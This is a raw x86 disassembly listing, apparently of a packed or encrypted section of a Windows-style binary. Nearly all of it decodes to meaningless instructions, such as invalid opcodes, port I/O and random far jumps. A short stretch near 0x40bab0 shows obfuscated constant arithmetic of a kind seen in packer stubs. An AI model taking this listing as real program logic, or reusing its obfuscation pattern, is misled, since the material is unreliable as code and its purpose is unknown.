  40b74c:	xchg   esp,eax
  40b74d:	aam    0x82
  40b74f:	cld    
  40b750:	pushf  
  40b751:	add    ch,cl
  40b753:	sti    
  40b754:	cdq    
  40b755:	mov    dh,0x2e
  40b757:	fdiv   DWORD PTR [esi-0x3d]
  40b75a:	push   ebx
  40b75b:	fsubr  QWORD PTR [ecx]
  40b75d:	jle    0x40b6e2
  40b75f:	xadd   eax,edi
  40b762:	out    dx,al
  40b763:	arpl   WORD PTR [edi],bx
  40b765:	mov    cl,0x1e
  40b767:	cli    
  40b768:	adc    eax,0x1a8a5144
  40b76d:	lock fld DWORD PTR [esp+eiz*4+0x683ca354]
  40b775:	add    al,0xc1
  40b777:	fwait
  40b778:	push   ss
  40b779:	pop    ebp
  40b77a:	mov    dh,0xaf
  40b77c:	adc    edx,DWORD PTR [eax+0x69b6c05d]
  40b782:	and    BYTE PTR [edx-0x7e27c201],bl
  40b788:	mov    al,ds:0xad230515
  40b78d:	cwde   
  40b78e:	and    eax,edi
  40b790:	sub    al,0x64
  40b792:	jbe    0x40b7fd
  40b794:	in     al,dx
  40b795:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40b796:	stc    
  40b797:	aaa    
  40b798:	sbb    esp,DWORD PTR [esi+0x1f1bbf6b]
  40b79e:	in     al,0x14
  40b7a0:	push   ss
  40b7a1:	cmp    ch,BYTE PTR [edx]
  40b7a3:	jnp    0x40b728
  40b7a5:	sbb    al,0x4b
  40b7a7:	bound  esp,QWORD PTR [esi+eiz*8-0x5bf63dad]
  40b7ae:	sbb    eax,0xd3dcd79f
  40b7b3:	fld    TBYTE PTR [ecx+0x20]
  40b7b6:	push   esp
  40b7b7:	repnz sbb BYTE PTR [esp+ebx*4+0xc326651],0x5c
  40b7c0:	pop    esi
  40b7c1:	inc    esp
  40b7c2:	(bad)  
  40b7c3:	cli    
  40b7c4:	punpcklwd mm4,DWORD PTR [esi-0x1ea6e630]
  40b7cb:	add    dh,BYTE PTR [ebx]
  40b7cd:	sub    eax,0xe0de2040
  40b7d2:	add    esi,DWORD PTR [edi-0x49]
  40b7d5:	cmp    ebx,DWORD PTR [ecx+0x62]
  40b7d8:	inc    ebp
  40b7d9:	fcmovnb st,st(2)
  40b7db:	imul   ebp,DWORD PTR [ebx-0x4227d9d4],0x7
  40b7e2:	mov    edx,DWORD PTR [edi+0x23]
  40b7e5:	jb     0x40b81b
  40b7e7:	lods   al,BYTE PTR ds:[esi]
  40b7e8:	or     BYTE PTR [ecx],cl
  40b7ea:	std    
  40b7eb:	inc    edi
  40b7ec:	(bad)  [eax]
  40b7ee:	test   eax,0xe426cbdd
  40b7f3:	jmp    0x8969:0x4eea7251
  40b7fa:	inc    edx
  40b7fb:	dec    edi
  40b7fc:	push   DWORD PTR [edi-0x11]
  40b7ff:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40b800:	outs   dx,BYTE PTR ds:[esi]
  40b801:	xchg   esi,eax
  40b802:	xchg   edi,eax
  40b803:	popa   
  40b804:	push   eax
  40b805:	adc    dh,BYTE PTR [ebp+0x61]
  40b808:	ret    0xa7b3
  40b80b:	jbe    0x40b854
  40b80d:	popa   
  40b80e:	push   esi
  40b810:	xchg   al,dh
  40b812:	imul   esi,DWORD PTR ds:0xd1d0e9a3,0x27
  40b819:	mov    al,ds:0x5d44e7e6
  40b81e:	jb     0x40b7e3
  40b820:	mov    dh,0x58
  40b822:	xchg   esi,eax
  40b823:	xchg   esi,eax
  40b824:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40b825:	xchg   DWORD PTR [eax-0x8d39654],eax
  40b82b:	mov    BYTE PTR [ecx+0x3f],ah
  40b82e:	xchg   ecx,eax
  40b82f:	mov    bh,cl
  40b831:	fwait
  40b832:	daa    
  40b833:	ret    
  40b834:	push   ds
  40b835:	and    al,0xf
  40b837:	sbb    DWORD PTR [ecx],ecx
  40b839:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40b83a:	push   ebx
  40b83b:	fmul   st,st(5)
  40b83d:	mov    esp,DWORD PTR [edx]
  40b83f:	retf   
  40b840:	pop    es
  40b841:	add    al,0xab
  40b843:	jmp    0x6d3e:0x8d3cb402
  40b84a:	xchg   ebx,eax
  40b84b:	or     edi,DWORD PTR [ebx+0x16]
  40b84e:	jo     0x40b843
  40b850:	and    DWORD PTR [ecx],ebp
  40b852:	or     ebx,DWORD PTR [edi+0x470eac01]
  40b858:	popf   
  40b859:	call   0x8652:0xdd16bd25
  40b860:	sar    ebx,1
  40b862:	imul   edx,DWORD PTR [ebx],0x37355518
  40b868:	inc    eax
  40b869:	sub    eax,0x264fc23f
  40b86e:	arpl   WORD PTR [edi],bx
  40b870:	jmp    0x40b864
  40b872:	fld    st(2)
  40b874:	adc    al,0x8d
  40b876:	out    0x99,al
  40b878:	and    bl,bh
  40b87a:	out    0x8d,eax
  40b87c:	call   0x4d94:0xc162a4f
  40b883:	pop    esi
  40b884:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40b885:	mov    edi,0xa1bb4515
  40b88a:	mov    ebp,ebx
  40b88c:	mov    ah,0x39
  40b88e:	scas   eax,DWORD PTR es:[edi]
  40b88f:	call   0x5a27:0x8aff702d
  40b896:	sbb    esi,ebx
  40b898:	mov    dl,0x8c
  40b89a:	inc    edx
  40b89b:	stos   BYTE PTR es:[edi],al
  40b89c:	fstp   QWORD PTR [edx]
  40b89e:	(bad)
  40b8a1:	dec    esp
  40b8a2:	sbb    BYTE PTR [edi-0xb7b376d],dh
  40b8a8:	repz or al,0x28
  40b8ab:	push   eax
  40b8ac:	mov    al,0x9c
  40b8ae:	dec    ebp
  40b8af:	scas   al,BYTE PTR es:[edi]
  40b8b0:	rsm    
  40b8b2:	adc    dh,BYTE PTR [ecx+0x48]
  40b8b5:	neg    BYTE PTR [eax+0xf1a2f5c]
  40b8bb:	pop    ebx
  40b8bc:	lods   al,BYTE PTR ds:[esi]
  40b8bd:	push   ebp
  40b8be:	jmp    0x40b84e
  40b8c0:	xchg   ebx,eax
  40b8c1:	fcom   QWORD PTR [ebx+0x4ab3a7c2]
  40b8c7:	dec    ebx
  40b8c8:	out    0xe0,al
  40b8ca:	and    edx,DWORD PTR [edx-0x7cb08531]
  40b8d0:	mov    BYTE PTR [edi],al
  40b8d2:	sbb    eax,0xb924be1a
  40b8d7:	fistp  WORD PTR [edi]
  40b8d9:	mov    bl,0x27
  40b8db:	aad    0xac
  40b8dd:	loop   0x40b8bd
  40b8df:	sub    ebx,edi
  40b8e1:	push   ebx
  40b8e2:	sbb    al,0x58
  40b8e4:	gs es push ecx
  40b8e7:	mov    edx,0xd2bfdf4f
  40b8ec:	sub    BYTE PTR [ebx+0xb],al
  40b8ef:	push   ss
  40b8f0:	out    dx,al
  40b8f1:	xchg   BYTE PTR ds:0x6ab959c3,ah
  40b8f7:	mov    ah,BYTE PTR [eax-0x30]
  40b8fa:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40b8fb:	push   ebp
  40b8fc:	mov    ds:0xe632c9eb,eax
  40b901:	ins    BYTE PTR es:[edi],dx
  40b902:	push   edi
  40b903:	adc    BYTE PTR [esi+0x6d],ah
  40b906:	cmc    
  40b907:	sbb    eax,DWORD PTR [ebx]
  40b909:	popa   
  40b90a:	pop    esi
  40b90b:	xchg   edi,eax
  40b90c:	push   ebx
  40b90d:	jo     0x40b91c
  40b90f:	push   ebx
  40b910:	push   ds
  40b911:	dec    ebp
  40b912:	jb     0x40b8d7
  40b914:	es aam 0x61
  40b917:	fdivp  st(1),st
  40b919:	shr    DWORD PTR [ebx+0x46d9633a],1
  40b91f:	imul   esi,DWORD PTR [edx],0xa797676b
  40b925:	or     al,0x4
  40b927:	out    dx,eax
  40b928:	xchg   BYTE PTR [esi+eiz*8],cl
  40b92b:	jb     0x40b93a
  40b92d:	shr    BYTE PTR [ebp+0x57dfcf9d],cl
  40b933:	in     al,dx
  40b934:	fcmovnb st,st(0)
  40b936:	ins    DWORD PTR es:[edi],dx
  40b937:	cmp    eax,0xd3f63197
  40b93c:	adc    eax,0x37234fe2
  40b941:	scas   eax,DWORD PTR es:[edi]
  40b942:	retf   
  40b943:	pop    es
  40b944:	fdiv   QWORD PTR [ebx+ebp*2-0x56]
  40b948:	mov    eax,ds:0xcac200e0
  40b94d:	lods   al,BYTE PTR ds:[esi]
  40b94e:	mov    ch,0x48
  40b950:	cmp    al,0x9a
  40b952:	sbb    DWORD PTR [edi-0x11],esi
  40b955:	cmp    al,0x76
  40b957:	or     edx,edx
  40b959:	rep ins BYTE PTR es:[edi],dx
  40b95b:	cmp    BYTE PTR [eax],bh
  40b95d:	pop    ebx
  40b95e:	xor    DWORD PTR [ebx+0x77c22e67],esp
  40b964:	cmp    DWORD PTR [ebp-0x1cf836cc],edi
  40b96a:	dec    edi
  40b96b:	or     BYTE PTR [eax+eiz*4],bl
  40b96e:	test   eax,0xe791e1c2
  40b973:	cmp    al,BYTE PTR [edi-0x574fc2c1]
  40b979:	inc    ecx
  40b97a:	jecxz  0x40b9b4
  40b97c:	lahf   
  40b97d:	rcr    ebx,cl
  40b97f:	mov    esp,0x98effd89
  40b984:	popf   
  40b985:	mov    ebx,0x4012904d
  40b98a:	mov    ebx,DWORD PTR ds:0xca7f407d
  40b990:	int3   
  40b991:	test   eax,0xc1222ccb
  40b996:	or     BYTE PTR [edx+ecx*2-0x12c9faa3],dl
  40b99d:	iret   
  40b99e:	add    ah,BYTE PTR [eax]
  40b9a0:	adc    DWORD PTR [esi],0xffffffda
  40b9a3:	outs   dx,BYTE PTR ds:[esi]
  40b9a4:	push   cs
  40b9a5:	adc    esp,esp
  40b9a7:	mov    ds:0x947b1bbb,al
  40b9ac:	xchg   esp,eax
  40b9ad:	push   edi
  40b9ae:	dec    edi
  40b9af:	jb     0x40ba1e
  40b9b1:	jmp    0x1b694c69
  40b9b6:	cmp    eax,0x8e414d09
  40b9bb:	clc    
  40b9bc:	adc    DWORD PTR [eax-0x441c9c3b],ebx
  40b9c2:	gs cs inc ecx
  40b9c5:	adc    al,0x5b
  40b9c7:	sub    ecx,edi
  40b9c9:	loopne 0x40ba02
  40b9cb:	adc    bl,BYTE PTR [ebx-0x76]
  40b9ce:	cli    
  40b9cf:	aas    
  40b9d0:	shl    BYTE PTR [esi+0x431aea55],0x2f
  40b9d7:	pop    ecx
  40b9d8:	or     al,0x63
  40b9da:	jae    0x40b98d
  40b9dc:	ret    
  40b9dd:	push   esp
  40b9de:	mov    ds:0x4de796c8,al
  40b9e3:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40b9e4:	loopne 0x40b9ad
  40b9e6:	mov    cl,0x53
  40b9e8:	mov    ch,0xae
  40b9ea:	stos   BYTE PTR es:[edi],al
  40b9eb:	pop    ebx
  40b9ec:	sub    DWORD PTR [ecx+0x75b6be5f],esi
  40b9f2:	dec    esp
  40b9f3:	mov    BYTE PTR [ecx-0x1bfd5d63],bh
  40b9f9:	mov    ebp,0x34bb97d5
  40b9fe:	mov    dh,0x79
  40ba00:	sbb    DWORD PTR [esi-0x2f],ebp
  40ba03:	cwde   
  40ba04:	test   DWORD PTR [esi],eax
  40ba06:	aaa    
  40ba07:	jne    0x40b9fd
  40ba09:	mov    ah,BYTE PTR [ecx]
  40ba0b:	in     eax,dx
  40ba0c:	pop    ebx
  40ba0d:	and    edx,DWORD PTR [eax-0x2b]
  40ba10:	sbb    DWORD PTR [edx+ebx*1+0x2e],esp
  40ba14:	xchg   edx,eax
  40ba15:	popf   
  40ba16:	pop    ebp
  40ba17:	mov    esi,0xce1c7f5
  40ba1c:	dec    eax
  40ba1d:	xchg   esi,eax
  40ba1e:	jp     0x40ba2d
  40ba20:	sub    DWORD PTR [esi+0x125ad665],0xa533b773
  40ba2a:	dec    esi
  40ba2b:	repz cmp DWORD PTR [ecx+eax*4],edi
  40ba2f:	stos   BYTE PTR es:[edi],al
  40ba30:	sub    eax,0x9ed07ad0
  40ba35:	test   eax,0xae759ec4
  40ba3a:	jnp    0x40b9fe
  40ba3c:	out    dx,eax
  40ba3d:	shr    esi,cl
  40ba3f:	sbb    bh,BYTE PTR [eax]
  40ba41:	loope  0x40ba62
  40ba43:	fistp  WORD PTR [ecx-0x46]
  40ba46:	jnp    0x40b9dc
  40ba48:	cmc    
  40ba49:	mov    al,ds:0xeae63a5
  40ba4e:	xchg   BYTE PTR [ecx],dh
  40ba50:	push   edi
  40ba51:	int    0xc2
  40ba53:	mov    edi,cs
  40ba55:	ds imul ebp,edx,0x61
  40ba59:	fdiv   QWORD PTR [ebp-0x59]
  40ba5c:	jno    0x40ba4c
  40ba5e:	mov    ebp,0x744b6174
  40ba63:	pop    edi
  40ba64:	jecxz  0x40b9e6
  40ba66:	ins    DWORD PTR es:[edi],dx
  40ba67:	jno    0x40ba4d
  40ba69:	iret   
  40ba6a:	mov    BYTE PTR [ecx],0xf1
  40ba6d:	cmp    dl,BYTE PTR [ecx-0x64f9c8ec]
  40ba73:	out    dx,eax
  40ba74:	sti    
  40ba75:	lods   al,BYTE PTR ds:[esi]
  40ba76:	test   al,0x62
  40ba78:	lds    edi,FWORD PTR [ebx]
  40ba7a:	out    0x12,eax
  40ba7c:	adc    dh,cl
  40ba7e:	aam    0x5d
  40ba80:	idiv   eax
  40ba82:	inc    edx
  40ba83:	lock inc esi
  40ba85:	or     BYTE PTR [edx],bl
  40ba87:	add    ecx,DWORD PTR [esi+eiz*1]
  40ba8a:	jl     0x40ba85
  40ba8c:	bound  ecx,QWORD PTR [ecx+0x16]
  40ba8f:	sbb    eax,0x8bb3ea4c
  40ba94:	(bad)
  40ba99:	test   al,0x21
  40ba9b:	cmp    DWORD PTR [esi+0x4],eax
  40ba9e:	aad    0xe2
  40baa0:	(bad)  
  40baa1:	adc    esp,DWORD PTR [edx+0x4f4a401b]
  40baa7:	adc    ebp,DWORD PTR [esi-0x3d03ba39]
  40baad:	popa   
  40baae:	add    BYTE PTR [eax],al
  40bab0:	mov    eax,DWORD PTR [ebp-0x4]
  40bab3:	mov    ecx,DWORD PTR [ebp-0x8]
  40bab6:	add    eax,0x1ca5
  40babb:	or     eax,ecx
  40babd:	mov    ecx,DWORD PTR ds:0x4226a8
  40bac3:	lea    eax,[eax+ecx*1-0x7eef]
  40baca:	mov    DWORD PTR [ebp-0x5c],eax
  40bacd:	mov    DWORD PTR [ebp-0x4],0x8ea
  40bad4:	mov    DWORD PTR [ebp-0x8],0x5759
  40badb:	mov    eax,DWORD PTR [ebp-0x8]
  40bade:	mov    ecx,DWORD PTR [ebp-0x4]
  40bae1:	and    eax,0x27f6
  40bae6:	xor    eax,ecx
  40bae8:	mov    ecx,DWORD PTR ds:0x4227dc
  40baee:	imul   eax,eax,0x18
  40baf1:	xor    eax,0x17970
  40baf6:	lea    eax,[ebp+eax*1-0x54]
  40bafa:	mov    DWORD PTR [eax],ecx
  40bafc:	jmp    0x40bf07
  40bb01:	retf   0xf4e7
  40bb04:	leave  
  40bb05:	hlt    
  40bb06:	fsincos 
  40bb08:	out    0xad,eax
  40bb0a:	and    dl,BYTE PTR [edx-0x62]
  40bb0d:	loopne 0x40bb80
  40bb0f:	mov    BYTE PTR [esi+ebp*2-0x6d414141],ah
  40bb16:	les    edi,FWORD PTR [esi-0x1c536f42]
  40bb1c:	xchg   ecx,eax
  40bb1d:	pop    edx
  40bb1e:	test   al,0x69
  40bb20:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40bb21:	cmp    BYTE PTR [eax-0xd19c889],cl
  40bb27:	ins    DWORD PTR es:[edi],dx
  40bb28:	ret    
  40bb29:	mov    eax,ds:0x1b19df73
  40bb2e:	xor    eax,DWORD PTR [ebx+0x56de7167]
  40bb34:	pusha  
  40bb35:	pop    ebx
  40bb36:	mov    ch,BYTE PTR [ecx+0xe]
  40bb39:	push   edx
  40bb3a:	cwde   
  40bb3b:	(bad)  
  40bb3c:	int3   
  40bb3d:	fsub   DWORD PTR [ebp-0x5f0a8832]
  40bb43:	push   ebx
  40bb44:	aas    
  40bb45:	cmp    DWORD PTR [esi-0x42],edi
  40bb48:	call   0x6eaf9b55
  40bb4d:	sbb    BYTE PTR [ecx-0x49],dl
  40bb50:	push   eax
  40bb51:	loop   0x40bae0
  40bb53:	xor    edx,0xb66abac1
  40bb59:	push   ds
  40bb5a:	sub    DWORD PTR [ebp-0xc],0x4ee71b0
  40bb61:	push   ebx
  40bb62:	sub    bl,BYTE PTR [ebp+ebx*1-0x334cd42]
  40bb69:	pushf  
  40bb6a:	pop    eax
  40bb6b:	mov    dh,0xf3
  40bb6d:	imul   ebx,DWORD PTR [ebp-0x7d],0x5a
  40bb71:	pop    ecx
  40bb72:	into   
  40bb73:	outs   dx,DWORD PTR ds:[esi]
  40bb74:	pop    esi
  40bb75:	and    ah,BYTE PTR [ebx]
  40bb77:	push   ebx
  40bb78:	jmp    0x40bb95
  40bb7a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40bb7b:	inc    eax
  40bb7c:	scas   eax,DWORD PTR es:[edi]
  40bb7d:	mov    esp,0xbb6018db
  40bb82:	rcr    bh,0xdc
  40bb85:	add    ecx,0x6ae826d9
  40bb8b:	mov    ds:0xe085fb20,al
  40bb90:	push   edx
  40bb91:	mov    ebx,0x5b51d13d
  40bb96:	mov    gs,WORD PTR [edi-0x51]
  40bb99:	inc    ebp
  40bb9a:	js     0x40bbbe
  40bb9c:	add    bh,bl
  40bb9e:	mov    ecx,0x1a6c0e6
  40bba3:	dec    ebx
  40bba4:	hlt    
  40bba5:	inc    ebp
  40bba6:	lds    eax,FWORD PTR [eax+0x15]
  40bba9:	pop    esp
  40bbaa:	aam    0x3
  40bbac:	sbb    BYTE PTR [edx-0x27],0xab
  40bbb0:	outs   dx,DWORD PTR ds:[esi]
  40bbb1:	mov    ds:0xd99b003d,al
  40bbb6:	lods   al,BYTE PTR ds:[esi]
  40bbb7:	xchg   edi,eax
  40bbb8:	sbb    dl,bl
  40bbba:	fisub  DWORD PTR [eax+edx*4-0x113ab409]
  40bbc1:	jp     0x40bbe2
  40bbc3:	shl    DWORD PTR [ebp+esi*2-0xf],cl
  40bbc7:	gs enter 0x122d,0x30
  40bbcc:	imul   DWORD PTR [ecx-0x1f]
  40bbcf:	pop    ebp
  40bbd0:	das    
  40bbd1:	jmp    0xf447:0xb13e98f0
  40bbd8:	mov    esp,0x34d48e55
  40bbdd:	xchg   ebp,ebp
  40bbdf:	ret    
  40bbe0:	or     eax,0x31a3a385
  40bbe5:	(bad)  
  40bbe6:	fmul   QWORD PTR [edi+ebp*2+0xa064a65]
  40bbed:	shl    bl,cl
  40bbef:	icebp  
  40bbf0:	jne    0x40bc3c
  40bbf2:	cmp    eax,0x11ddba4e
  40bbf7:	and    bl,BYTE PTR [edi]
  40bbf9:	enter  0x3730,0x61
  40bbfd:	adc    BYTE PTR [edx+0x206316eb],dl
  40bc03:	(bad)  
  40bc04:	or     dh,BYTE PTR [ecx]
  40bc06:	pop    edi
  40bc07:	sub    dl,BYTE PTR gs:[ebx]
  40bc0a:	mov    BYTE PTR [edx+0xb],bh
  40bc0d:	push   esi
  40bc0e:	dec    esi
  40bc0f:	jl     0x40bbbc
  40bc11:	mov    bh,0x21
  40bc13:	ret    0xfac1
  40bc16:	out    dx,eax
  40bc17:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40bc18:	repnz out 0x2e,al
  40bc1b:	sbb    bl,bl
  40bc1d:	adc    esp,eax
  40bc1f:	test   esi,0xb335d77c
  40bc25:	inc    esp
  40bc26:	sub    ebp,DWORD PTR [edx]
  40bc28:	xor    al,0xfc
  40bc2a:	jl     0x40bc53
  40bc2c:	and    eax,0x27c0f9c2
  40bc31:	dec    ebx
  40bc32:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40bc33:	inc    esp
  40bc34:	xor    eax,ecx
  40bc36:	adc    ecx,ebx
  40bc38:	(bad)  
  40bc39:	mov    edx,0x98d9ed67
  40bc3e:	mov    DWORD PTR [ebp-0x1c],ebx
  40bc41:	retf   0xd3eb
  40bc44:	dec    ebx
  40bc45:	sbb    eax,0xaaba97a3
  40bc4a:	add    esi,DWORD PTR [esi-0x19b1571]
  40bc50:	xchg   edi,eax
  40bc51:	inc    ebx
  40bc52:	retf   
  40bc53:	pop    ecx
  40bc54:	jmp    0x40bbe0
  40bc56:	mov    WORD PTR [ebp-0x23ddb4c2],gs
  40bc5c:	pushf  
  40bc5d:	pop    es
  40bc5e:	and    dh,bh
  40bc60:	(bad)  
  40bc61:	pop    ss
  40bc62:	cmp    ch,ah
  40bc64:	ins    BYTE PTR es:[edi],dx
  40bc65:	sub    al,0xbc
  40bc67:	pop    ebp
  40bc68:	ror    DWORD PTR [edi],cl
  40bc6a:	jnp    0x40bc8a
  40bc6c:	push   esi
  40bc6d:	test   al,0xc5
  40bc6f:	sbb    edx,DWORD PTR [ecx-0x42c22921]
  40bc75:	(bad)  
  40bc76:	sti    
  40bc77:	push   ds
  40bc78:	ss enter 0xf8a9,0x60
  40bc7d:	jns    0x40bc5e
  40bc7f:	iret   
  40bc80:	xchg   esp,eax
  40bc81:	push   cs
  40bc82:	rcl    BYTE PTR [edi-0x48996c60],cl
  40bc88:	or     eax,esp
  40bc8a:	jecxz  0x40bce2
  40bc8c:	sbb    eax,edi
  40bc8e:	mov    ds:0xcb9d3350,al
  40bc93:	xor    eax,0x72226767
  40bc98:	dec    eax
  40bc99:	das    
  40bc9a:	xor    al,0x18
  40bc9c:	sbb    ch,dh
  40bc9e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40bc9f:	mov    bh,0xda
  40bca1:	stos   BYTE PTR es:[edi],al
  40bca2:	stos   BYTE PTR es:[edi],al
  40bca3:	mov    bl,0x6d
  40bca5:	sahf   
  40bca6:	or     esp,DWORD PTR [ebx-0x362d9e32]
  40bcac:	and    BYTE PTR [edi+0x3f],0x59
  40bcb0:	mov    bl,0xc3
  40bcb2:	jle    0x40bc4a
  40bcb4:	sar    BYTE PTR [ebx-0x30c3eebd],cl
  40bcba:	dec    edi
  40bcbb:	xchg   DWORD PTR [ebx-0x6894e563],ebx
  40bcc1:	pop    ebp
  40bcc2:	test   eax,0x8eb8377c
  40bcc7:	push   ds
  40bcc8:	stos   BYTE PTR es:[edi],al
  40bcc9:	adc    ch,BYTE PTR [esi]
  40bccb:	pop    esp
  40bccc:	push   edx
  40bccd:	pop    esp
  40bcce:	adc    DWORD PTR [edx-0x72b7676a],ebx
  40bcd4:	fldenv [ebx+0x7e4a3e92]
  40bcda:	fcmovbe st,st(2)
  40bcdc:	push   esp
  40bcdd:	sar    BYTE PTR [ebx+0x21d36420],1
  40bce3:	xchg   BYTE PTR [esi],bh
  40bce5:	mov    cl,0x52
  40bce7:	mov    ch,0x6
  40bce9:	sbb    esp,DWORD PTR [edx-0x44]
  40bcec:	sbb    esp,DWORD PTR [edx]
  40bcee:	xchg   dh,bh
  40bcf0:	pop    esi
  40bcf1:	paddb  mm3,QWORD PTR [ebx-0x56]
  40bcf5:	sbb    BYTE PTR [esi],ch
  40bcf7:	xchg   ecx,eax
  40bcf8:	es sub ch,0x8d
  40bcfc:	adc    edi,DWORD PTR [ecx-0xb]
  40bcff:	push   0x8129b63d
  40bd04:	mov    eax,0xb3b67b74
  40bd09:	push   cs
  40bd0a:	ins    DWORD PTR es:[edi],dx
  40bd0b:	popf   
  40bd0c:	sbb    BYTE PTR [esi],dl
  40bd0e:	add    DWORD PTR [eax-0x75],0x7e189bef
  40bd15:	fstp   DWORD PTR [edx-0x2b7244b]
  40bd1b:	int    0x3c
  40bd1d:	mov    esp,esi
  40bd1f:	inc    ecx
  40bd20:	add    edi,ecx
  40bd22:	cmp    bl,bh
  40bd24:	adc    BYTE PTR fs:[edi+0x3415d7a8],bl
  40bd2b:	lods   al,BYTE PTR ds:[esi]
  40bd2c:	cmp    al,BYTE PTR [esi-0x6cd4a843]
  40bd32:	lds    edi,FWORD PTR [edx]
  40bd34:	das    
  40bd35:	loope  0x40bd0d
  40bd37:	mov    edi,0xcf5aa726
  40bd3c:	sbb    ecx,DWORD PTR [ecx+ebp*1-0x52]
  40bd40:	add    BYTE PTR [ebx-0x22],bh
  40bd43:	rcr    eax,cl
  40bd45:	cdq    
  40bd46:	mov    ?,ebp
  40bd48:	cmp    eax,0xa9f3dd83
  40bd4d:	inc    esi
  40bd4e:	jp     0x40bd32
  40bd50:	mov    ecx,0x5832f401
  40bd55:	push   0xfffffff7
  40bd57:	sbb    DWORD PTR [eax+ecx*8-0x1f],edi
  40bd5b:	inc    esp
  40bd5c:	adc    BYTE PTR [ebx-0x7f],al
  40bd5f:	out    dx,al
  40bd60:	shl    al,1
  40bd62:	popa   
  40bd63:	pop    esp
  40bd64:	mov    al,0x32
  40bd66:	mov    dh,0x41
  40bd68:	cs xchg ebp,eax
  40bd6a:	loope  0x40bd9b
  40bd6c:	ja     0x40bde7
  40bd6e:	mov    WORD PTR [esi],gs
  40bd70:	ja     0x40bd71
  40bd72:	ret    
  40bd73:	jmp    DWORD PTR [ecx+0x7e3e0186]
  40bd79:	dec    esp
  40bd7a:	scas   al,BYTE PTR es:[edi]
  40bd7b:	lods   eax,DWORD PTR ds:[esi]
  40bd7c:	cdq    
  40bd7d:	in     eax,dx
  40bd7e:	in     eax,0x1e
  40bd80:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40bd81:	and    ah,bh
  40bd83:	xchg   ebx,eax
  40bd84:	add    eax,0x733946e0
  40bd89:	sbb    BYTE PTR [edi+0x46],ch
  40bd8c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40bd8d:	jne    0x40bd61
  40bd8f:	jg     0x40bd5e
  40bd91:	not    edx
  40bd93:	dec    ebp
  40bd94:	add    al,0xcc
  40bd96:	push   eax
  40bd97:	retf   0x3ed1
  40bd9a:	mov    BYTE PTR [esi],dh
  40bd9c:	idiv   BYTE PTR [ebx-0x62]
  40bd9f:	jg     0x40bd99
  40bda1:	not    DWORD PTR [esp+ecx*2]
  40bda4:	or     al,0xaa
  40bda6:	mov    al,ds:0x2c8dbe2c
  40bdab:	xor    eax,0x80cb6c6b
  40bdb0:	fld    DWORD PTR [ebp+0x54]
  40bdb3:	push   esp
  40bdb4:	inc    eax
  40bdb5:	jb     0x40bde9
  40bdb7:	push   ds
  40bdb8:	loopne 0x40bd77
  40bdba:	xchg   edx,eax
  40bdbb:	ss cs scas al,BYTE PTR es:[edi]
  40bdbe:	retf   0x6302
  40bdc1:	in     al,0x41
  40bdc3:	(bad)  
  40bdc4:	jecxz  0x40bdcc
  40bdc6:	add    eax,0x13c4aa36
  40bdcb:	mov    al,ds:0x9fc65654
  40bdd0:	mov    edi,ebx
  40bdd2:	fwait
  40bdd3:	rcl    DWORD PTR [edx],cl
  40bdd5:	inc    eax
  40bdd6:	mov    eax,0x3e8550d4
  40bddb:	xchg   ecx,eax
  40bddc:	push   0x66870949
  40bde1:	and    al,BYTE PTR [ebp-0x272a10db]
  40bde7:	es sub bl,bh
  40bdea:	cmp    esp,esp
  40bdec:	in     eax,0x25
  40bdee:	icebp  
  40bdef:	test   al,0xb0
  40bdf1:	push   ss
  40bdf2:	nop
  40bdf3:	clc    
  40bdf4:	mov    edi,0xd6ebd67e
  40bdf9:	das    
  40bdfa:	enter  0xb963,0xaa
  40bdfe:	jb     0x40be5a
  40be00:	pop    ds
  40be01:	repz rcr DWORD PTR [edx],0x66
  40be05:	xor    al,0xf7
  40be07:	adc    ch,dl
  40be09:	xor    bl,BYTE PTR [ebx]
  40be0b:	mov    ds:0x7d1f519a,al
  40be10:	xor    dl,BYTE PTR [edi-0x52030f29]
  40be16:	rcr    al,cl
  40be18:	test   al,0xea
  40be1a:	and    al,0x6e
  40be1c:	shl    al,cl
  40be1e:	(bad)  
  40be1f:	or     al,0xdd
  40be21:	stc    
  40be22:	xor    DWORD PTR [ebx-0x20706ad1],edx
  40be28:	fsub   QWORD PTR [ecx+0x5225c5e1]
  40be2e:	sahf   
  40be2f:	in     al,0x6e
  40be31:	jmp    0x4d445762
  40be36:	scas   eax,DWORD PTR es:[edi]
  40be37:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40be38:	mov    dl,0x83
  40be3a:	sti    
  40be3b:	shl    BYTE PTR [ebx],cl
  40be3d:	sub    DWORD PTR [esp-0x76a83e82],edi
  40be44:	retf   
  40be45:	mov    ah,0xb4
  40be47:	(bad)  
  40be48:	mov    al,0x38
  40be4a:	fst    QWORD PTR [ebp-0x32]
  40be4d:	scas   al,BYTE PTR es:[edi]
  40be4e:	repnz retf 0x287f
  40be52:	rol    BYTE PTR [edi+0x116dfb58],0xc8
  40be59:	mov    ebp,0x188d6623
  40be5e:	loope  0x40be04
  40be60:	add    cl,al
  40be62:	push   es
  40be63:	mov    edx,?
  40be65:	ret    
  40be66:	out    0x3,eax
  40be68:	retf   0xb97e
  40be6b:	(bad)  
  40be6c:	fisubr DWORD PTR [ebp+0x4778fd75]
  40be72:	scas   eax,DWORD PTR es:[edi]
  40be73:	imul   edx,DWORD PTR [edi-0x55b21c2e],0xcf133fb1
  40be7d:	arpl   WORD PTR ds:[ebx+0x223f43ff],cx
  40be84:	scas   eax,DWORD PTR es:[edi]
  40be85:	xchg   ecx,eax
  40be86:	dec    ebx
  40be87:	fdivr  QWORD PTR [edi-0x2a8a0afa]
  40be8d:	leave  
  40be8e:	and    cl,BYTE PTR [ecx+0x3f]
  40be91:	retf   0x8797
  40be94:	or     dh,dh
  40be96:	inc    esi
  40be97:	aad    0x92
  40be99:	fstp   st(4)
